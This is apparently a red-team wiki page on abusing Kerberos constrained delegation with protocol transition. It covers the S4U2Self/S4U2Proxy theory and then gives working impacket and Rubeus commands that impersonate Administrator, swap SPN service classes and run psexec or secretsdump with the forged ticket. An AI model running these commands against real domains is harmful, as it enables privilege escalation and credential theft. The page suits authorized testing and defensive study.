# 🎯 Constrained Delegation

## Theory

**Constrained delegation** restricts an account to delegating only toward the SPNs listed in
its **`msDS-AllowedToDelegateTo`** attribute. When the account also has **protocol
transition** (`TRUSTED_TO_AUTH_FOR_DELEGATION`), it can use **S4U2Self** to request a ticket
**for any user** to itself, then **S4U2Proxy** to forward it to an allowed SPN - no victim
password required.

::: details

| Aspect         | Value                                                                       |
| -------------- | --------------------------------------------------------------------------- |
| **Scope**      | Only the SPNs in `msDS-AllowedToDelegateTo`, but as **any** impersonated user |
| **Key**        | The delegating account's secret (password / NT hash / AES key)              |
| **Stealth**    | Medium - normal-looking S4U traffic, but to an unusual SPN                   |
| **Use when**   | You own an account with constrained delegation + protocol transition        |
| **Avoid when** | You have no account secret (-> RBCD via ACL write)                          |

:::

**Why it works** - with protocol transition the KDC lets the account ask for a ticket on
behalf of a user it never authenticated (S4U2Self), so you pick the user (e.g.
`Administrator`) freely and S4U2Proxy delivers a usable service ticket.

> [!warning] Two limits
> - **Without** `TRUSTED_TO_AUTH_FOR_DELEGATION`, there is no protocol transition: you can
>   only forward a TGT the user actually sent you, so free impersonation does **not** work.
> - Accounts in **Protected Users** or flagged **"sensitive, cannot be delegated"** cannot
>   be impersonated.

## Practice

### Requirements

::: details

| Requirement              | How to get it                                            |
| ------------------------ | -------------------------------------------------------- |
| Delegating account secret | Compromised service/computer account (password/hash/AES) |
| Allowed SPN(s)           | `findDelegation` / `msDS-AllowedToDelegateTo`            |
| User to impersonate      | A privileged account, e.g. `Administrator`               |

:::

### Enumerate the allowed SPNs

```bash
impacket-findDelegation $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
```

### S4U - request a ticket as the impersonated user

::: code-group

```bash [getST (Linux)]
# Password / NT hash / AES key / existing ticket
impacket-getST -spn cifs/$TARGET_HOST -impersonate Administrator -dc-ip $DC_IP $DOMAIN/$SVC:$PASSWORD
impacket-getST -spn cifs/$TARGET_HOST -impersonate Administrator -dc-ip $DC_IP -hashes :$NT_HASH $DOMAIN/$SVC
impacket-getST -spn cifs/$TARGET_HOST -impersonate Administrator -dc-ip $DC_IP -aesKey $AES_KEY $DOMAIN/$SVC

# Swap the service class to reach another service on the SAME host (cifs -> host, ldap, http...)
impacket-getST -spn cifs/$TARGET_HOST -altservice ldap -impersonate Administrator -dc-ip $DC_IP $DOMAIN/$SVC:$PASSWORD
```

```powershell [Rubeus (Windows)]
Rubeus.exe s4u /user:$SVC /rc4:$NT_HASH /impersonateuser:Administrator \
  /msdsspn:"cifs/$TARGET_HOST" /altservice:host /ptt
```

:::

### Use the ticket

```bash
export KRB5CCNAME=Administrator@cifs_$TARGET_HOST@$DOMAIN.ccache     # name printed by getST
klist

impacket-psexec -k -no-pass $DOMAIN/Administrator@$TARGET_HOST       # or wmiexec / secretsdump
```

> [!tip] SPN substitution
> `msDS-AllowedToDelegateTo` constrains the **SPN string**, not the service class. The KDC
> does not validate the service class on S4U2Proxy, so `-altservice` / `/altservice` lets
> you turn an allowed `cifs/host` into `host/host`, `ldap/host`, etc. on the same host.
